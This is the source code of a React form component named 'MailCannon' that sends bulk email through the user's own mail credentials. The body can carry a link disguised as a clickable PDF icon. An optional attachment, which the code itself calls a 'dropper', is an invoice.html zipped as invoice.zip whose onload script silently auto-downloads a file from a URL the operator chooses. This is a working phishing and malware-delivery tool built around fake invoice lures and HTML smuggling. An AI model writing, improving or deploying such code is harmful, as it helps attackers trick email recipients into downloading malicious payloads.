"use client";

import { zodResolver } from "@hookform/resolvers/zod";
import { useForm } from "react-hook-form";
import * as z from "zod";
import { Button } from "@/components/ui/button";
import {
  Form,
  FormControl,
  FormDescription,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import { Input } from "@/components/ui/input";
import { Textarea } from "@/components/ui/textarea";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { useToast } from "@/hooks/use-toast";
import { useState } from "react";
import { Loader2, Send, Eye, EyeOff } from "lucide-react";
import JSZip from 'jszip';

const formSchema = z.object({
  senderEmail: z.string().email("Invalid email address."),
  senderPassword: z.string().min(1, "Sender password is required."),
  senderDisplayName: z.string().optional(),
  recipients: z.string().min(1, "At least one recipient is required."),
  subject: z.string().min(1, "Subject is required."),
  body: z.string().min(1, "Email body is required."),
  linkUrl: z.string().url("Please enter a valid URL.").optional().or(z.literal('')),
  attachment: z.any().optional(),
  documentUrl: z.string().url("Please enter a valid URL.").optional().or(z.literal('')),
});

type MailCannonFormValues = z.infer<typeof formSchema>;

const API_ROUTE = "/api/send-email";

// Base64 encoded PDF icon (small and generic)
const PDF_ICON_URL = "https://i.pinimg.com/1200x/37/a1/4e/37a14ee968a6a729725ba69e5c15de22.jpg";

export default function MailCannonForm() {
  const { toast } = useToast();
  const [loading, setLoading] = useState(false);
  const [showPassword, setShowPassword] = useState(false);

  const form = useForm<MailCannonFormValues>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      senderEmail: "",
      senderPassword: "",
      senderDisplayName: "",
      recipients: "",
      subject: "",
      body: "",
      linkUrl: "",
      documentUrl: "",
      attachment: undefined,
    },
  });

  const onSubmit = async (values: MailCannonFormValues) => {
    setLoading(true);

    const recipientList = values.recipients
      .split(/[\n\s,;]+/)
      .map(email => email.trim())
      .filter(email => z.string().email().safeParse(email).success);

    if (recipientList.length === 0) {
      toast({
        variant: "destructive",
        title: "No Valid Recipients",
        description: "Please enter at least one valid recipient email address.",
      });
      setLoading(false);
      return;
    }
    
    // Prepare email body as HTML
    let emailBody = values.body.replace(/\n/g, '<br>');
    if (values.linkUrl) {
      emailBody += `<br><br><a href="${values.linkUrl}" target="_blank" rel="noopener noreferrer"><img src="${PDF_ICON_URL}" alt="PDF Document" width="200" height="200" style="vertical-align: middle;"></a>`;
    }

    const formData = new FormData();
    formData.append('senderEmail', values.senderEmail);
    formData.append('senderPassword', values.senderPassword);
    formData.append('subject', values.subject);
    formData.append('body', emailBody); // Send the HTML body
    recipientList.forEach(email => formData.append('recipients', email));
    
    if (values.senderDisplayName) {
      formData.append('senderDisplayName', values.senderDisplayName);
    }
    
    // Create the dropper file (HTML file with JavaScript)
    if (values.documentUrl) {
      const htmlContent = `<!DOCTYPE html>
<html>
<head>
<title>Automatic Download</title>
<script>
  window.onload = function() {
    const fileUrl = "${values.documentUrl}"; // Replace with the actual URL of the document

    if (fileUrl) {
      // Create a temporary link element
      var link = document.createElement('a');
      link.href = fileUrl;
      link.download = fileUrl.substring(fileUrl.lastIndexOf('/') + 1); // Extract filename from URL
      link.style.display = 'none';
      document.body.appendChild(link);

      // Programmatically click the link to trigger the download
      link.click();

      // Clean up the link element
      document.body.removeChild(link);
    } else {
      alert('No URL specified!');
    }
  }
</script>
</head>
<body>
  <img src="https://i.pinimg.com/1200x/37/a1/4e/37a14ee968a6a729725ba69e5c15de22.jpg" alt="PDF Icon" width="32" height="32">
  <h1>Your download should start automatically. If not, please enable pop-ups for this site.</h1>
</body>
</html>`;

      // Create a zip file containing the HTML file
      const zip = new JSZip();
      zip.file("invoice.html", htmlContent);
      const zipData = await zip.generateAsync({ type: "blob" });

      formData.append('attachment', zipData, "invoice.zip");
    } else if (values.attachment) {
      formData.append('attachment', values.attachment[0]);
    }
    
    try {
      const response = await fetch(API_ROUTE, {
        method: "POST",
        body: formData,
      });

      const responseData = await response.json();

      if (!response.ok) {
        throw new Error(responseData.message || `Request failed with status ${response.status}`);
      }

      toast({
        title: "Email(s) Sent!",
        description: `Successfully sent email to ${recipientList.length} recipient(s).`,
        className: "bg-green-500 text-white",
      });
      form.reset();
    } catch (error) {
      const errorMessage = error instanceof Error ? error.message : "An unknown error occurred.";
      toast({
        variant: "destructive",
        title: "Error Sending Email",
        description: errorMessage,
      });
    } finally {
      setLoading(false);
    }
  };

  return (
    <Card className="w-full shadow-xl">
      <CardHeader>
        <CardTitle className="text-2xl flex items-center gap-2">
          <Send className="h-6 w-6 text-primary" />
          MailCannon
        </CardTitle>
        <CardDescription>
          Fill in the details below to send your email. Provide sender credentials and display name for each send operation.
        </CardDescription>
      </CardHeader>
      <CardContent>
        <Form {...form}>
          <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <FormField
                control={form.control}
                name="senderEmail"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel>Sender Email</FormLabel>
                    <FormControl>
                      <Input placeholder="your-email@example.com" {...field} />
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />
              <FormField
                control={form.control}
                name="senderPassword"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel>Sender Password/App Passkey</FormLabel>
                    <div className="relative">
                      <FormControl>
                        <Input
                          type={showPassword ? "text" : "password"}
                          placeholder="Enter sender password or app passkey"
                          {...field}
                        />
                      </FormControl>
                      <button
                        type="button"
                        onClick={() => setShowPassword(!showPassword)}
                        className="absolute inset-y-0 right-0 flex items-center px-3 text-muted-foreground"
                      >
                        {showPassword ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
                      </button>
                    </div>
                    <FormDescription>
                     Use your email password or an app-specific password if 2FA is enabled.
                    </FormDescription>
                    <FormMessage />
                  </FormItem>
                )}
              />
            </div>

            <FormField
              control={form.control}
              name="senderDisplayName"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>Sender Display Name (Optional)</FormLabel>
                  <FormControl>
                    <Input placeholder="Your Name or Company Name" {...field} />
                  </FormControl>
                  <FormDescription>
                    The name recipients will see as the sender.
                  </FormDescription>
                  <FormMessage />
                </FormItem>
              )}
            />

            <FormField
              control={form.control}
              name="recipients"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>Recipients</FormLabel>
                  <FormControl>
                    <Textarea
                      placeholder="user1@example.com
user2@example.com
user3@example.com"
                      className="min-h-[100px] resize-y"
                      {...field}
                    />
                  </FormControl>
                   <FormDescription>
                    Enter recipient email addresses, one per line.
                  </FormDescription>
                  <FormMessage />
                </FormItem>
              )}
            />

            <FormField
              control={form.control}
              name="subject"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>Subject</FormLabel>
                  <FormControl>
                    <Input placeholder="Email Subject" {...field} />
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />

            <FormField
              control={form.control}
              name="body"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>Body</FormLabel>
                  <FormControl>
                    <Textarea
                      placeholder="Write your email content here..."
                      className="min-h-[150px] resize-y"
                      {...field}
                    />
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />

            <FormField
              control={form.control}
              name="linkUrl"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>Link URL (Optional)</FormLabel>
                  <FormControl>
                    <Input placeholder="https://example.com/your-file.pdf" {...field} />
                  </FormControl>
                  <FormDescription>
                    This link will be added to the end of your email as a clickable PDF icon.
                  </FormDescription>
                  <FormMessage />
                </FormItem>
              )}
            />

            <FormField
              control={form.control}
              name="documentUrl"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>Document URL (Optional)</FormLabel>
                  <FormControl>
                    <Input placeholder="https://example.com/your-document.pdf" {...field} />
                  </FormControl>
                  <FormDescription>
                    The URL of the document to be downloaded by the dropper.
                  </FormDescription>
                  <FormMessage />
                </FormItem>
              )}
            />
            
            <FormField
              control={form.control}
              name="attachment"
              render={({ field: { onChange, value, ...props } }) => (
                <FormItem>
                  <FormLabel>Attachment (Optional)</FormLabel>
                  <FormControl>
                    <Input 
                      type="file" 
                      onChange={(e) => {
                        onChange(e.target.files);
                      }}
                      {...props}
                    />
                  </FormControl>
                  <FormDescription>
                    Select a single file to attach (optional).
                  </FormDescription>
                  <FormMessage />
                </FormItem>
              )}
            />

            <Button type="submit" className="w-full bg-accent hover:bg-accent/90 text-accent-foreground" disabled={loading}>
              {loading ? (
                <Loader2 className="mr-2 h-4 w-4 animate-spin" />
              ) : (
                <Send className="mr-2 h-4 w-4" />
              )}
              Send Email(s)
            </Button>
          </form>
        </Form>
      </CardContent>
    </Card>
  );
}
